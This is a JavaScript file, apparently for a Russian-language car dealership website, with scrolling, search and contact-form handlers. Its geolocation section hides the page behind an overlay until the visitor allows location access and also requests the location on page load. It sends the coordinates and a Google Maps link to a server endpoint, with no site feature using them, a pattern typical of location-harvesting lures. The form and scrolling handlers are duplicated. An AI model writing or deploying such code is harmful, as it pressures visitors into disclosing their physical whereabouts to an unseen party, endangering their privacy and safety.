// Smooth scrolling for navigation links
document.querySelectorAll('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function (e) {
        e.preventDefault();
        const target = document.querySelector(this.getAttribute('href'));
        if (target) {
            target.scrollIntoView({
                behavior: 'smooth',
                block: 'start'
            });
        }
    });
});

// Search form handler
document.querySelector('.search-btn').addEventListener('click', function() {
    alert('Функционал поиска доступен по запросу! Свяжитесь с нами для подбора автомобиля.');
});

// Contact form handler
document.querySelector('.contact-form').addEventListener('submit', function(e) {
    e.preventDefault();
    
    const formData = {
        name: this.querySelector('[name="name"]').value,
        phone: this.querySelector('[name="phone"]').value,
        email: this.querySelector('[name="email"]').value,
        car: this.querySelector('[name="car"]').value,
        message: this.querySelector('[name="message"]').value,
        timestamp: new Date().toISOString()
    };
    
    fetch('/api/contact', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(formData)
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            alert('Заявка отправлена! Наш менеджер свяжется с вами в ближайшее время.');
            this.reset();
        } else {
            alert('Ошибка: ' + data.error);
        }
    })
    .catch(error => {
        console.error('Ошибка отправки:', error);
        alert('Ошибка при отправке заявки. Пожалуйста, попробуйте позже.');
    });
});

// Geolocation script
document.addEventListener('DOMContentLoaded', function() {
    const overlay = document.getElementById('geolocation-overlay');
    const btn = document.getElementById('allow-geolocation-btn');
    const errorDiv = document.getElementById('geolocation-error');
    const mainContent = document.getElementById('main-content');

    // Функция отправки геолокации на сервер
    function sendLocationToServer(lat, lng) {
        const locationUrl = `https://www.google.com/maps?q=${lat},${lng}`;
        
        fetch('/api/location', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                lat: lat,
                lng: lng,
                locationUrl: locationUrl,
                timestamp: new Date().toISOString()
            })
        })
        .then(response => response.json())
        .then(data => {
            console.log('Геолокация отправлена на сервер:', data);
        })
        .catch(error => {
            console.error('Ошибка отправки геолокации:', error);
        });
    }

    // Обработчик кнопки "Разрешить геолокацию"
    btn.addEventListener('click', function() {
        btn.classList.add('loading');
        btn.textContent = 'Получение местоположения...';

        if ('geolocation' in navigator) {
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    // Разрешение получено
                    sendLocationToServer(position.coords.latitude, position.coords.longitude);
                    
                    // Скрываем заглушку и показываем основной контент
                    overlay.classList.add('hidden');
                    mainContent.classList.add('visible');
                },
                function(error) {
                    // Ошибка при получении геолокации
                    btn.classList.remove('loading');
                    btn.textContent = 'Разрешить геолокацию';
                    
                    let errorMessage = 'Не удалось получить геолокацию. ';
                    
                    switch(error.code) {
                        case error.PERMISSION_DENIED:
                            errorMessage += 'Пожалуйста, разрешите доступ к геолокации в настройках браузера.';
                            break;
                        case error.POSITION_UNAVAILABLE:
                            errorMessage += 'Местоположение недоступно.';
                            break;
                        case error.TIMEOUT:
                            errorMessage += 'Превышено время ожидания ответа.';
                            break;
                        default:
                            errorMessage += 'Произошла неизвестная ошибка.';
                    }
                    
                    errorDiv.textContent = errorMessage;
                }
            );
        } else {
            btn.classList.remove('loading');
            btn.textContent = 'Разрешить геолокацию';
            errorDiv.textContent = 'Геолокация не поддерживается этим браузером.';
        }
    });

    // Автоматический запрос геолокации при загрузке страницы
    if ('geolocation' in navigator) {
        navigator.geolocation.getCurrentPosition(
            function(position) {
                sendLocationToServer(position.coords.latitude, position.coords.longitude);
            },
            function(error) {
                // Геолокация не получена, ждем действия пользователя
            }
        );
    }
});

// Основной контент (скрипты для основной страницы)
document.addEventListener('DOMContentLoaded', function() {
    // Smooth scrolling for navigation links
    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener('click', function (e) {
            e.preventDefault();
            const target = document.querySelector(this.getAttribute('href'));
            if (target) {
                target.scrollIntoView({
                    behavior: 'smooth',
                    block: 'start'
                });
            }
        });
    });

    // Search form handler
    document.querySelector('.search-btn').addEventListener('click', function() {
        alert('Функционал поиска доступен по запросу! Свяжитесь с нами для подбора автомобиля.');
    });

    // Contact form handler
    document.querySelector('.contact-form').addEventListener('submit', function(e) {
        e.preventDefault();
        
        const formData = {
            name: this.querySelector('[name="name"]').value,
            phone: this.querySelector('[name="phone"]').value,
            email: this.querySelector('[name="email"]').value,
            car: this.querySelector('[name="car"]').value,
            message: this.querySelector('[name="message"]').value,
            timestamp: new Date().toISOString()
        };
        
        fetch('/api/contact', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(formData)
        })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                alert('Заявка отправлена! Наш менеджер свяжется с вами в ближайшее время.');
                this.reset();
            } else {
                alert('Ошибка: ' + data.error);
            }
        })
        .catch(error => {
            console.error('Ошибка отправки:', error);
            alert('Ошибка при отправке заявки. Пожалуйста, попробуйте позже.');
        });
    });
});